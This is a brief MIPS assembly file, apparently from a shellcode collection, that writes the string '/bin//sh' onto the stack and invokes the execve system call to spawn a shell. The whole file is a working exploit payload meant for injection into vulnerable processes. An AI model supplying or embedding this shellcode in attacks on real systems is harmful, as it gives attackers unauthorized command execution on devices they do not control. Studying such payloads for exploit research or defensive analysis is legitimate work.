;;;
;;; MIPS sys_execve("/bin/sh") shellcode
;;;
;;; @_hugsy_
;;;
li $v0, 0x2f62696e
sw $v0, 0($sp)
li $v0, 0x2f2f7368
sw $v0, 4($sp)
li $v0, __NR_SYS_execve
move $a0, $sp
li $a1, 0
li $a2, 0
syscall
